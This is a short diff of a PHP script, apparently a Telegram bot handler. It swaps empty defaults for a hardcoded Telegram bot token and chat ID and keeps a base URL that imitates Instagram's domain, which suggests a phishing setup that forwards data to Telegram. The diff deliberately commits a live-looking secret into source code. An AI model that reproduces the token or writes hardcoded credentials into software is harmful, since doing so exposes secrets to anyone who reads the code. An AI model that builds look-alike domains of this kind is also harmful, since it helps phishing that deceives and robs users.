@@ -12,8 +12,9 @@ if (file_exists(__DIR__ . '/.env')) {
     }
 }
 
-$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "";
-$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "";
+// Hardcoded credentials as fallback
+$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
+$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
 $base_url = getenv('BASE_URL') ?: "https://instagram-www.up.railway.app";
 
 // Get incoming update from Telegram
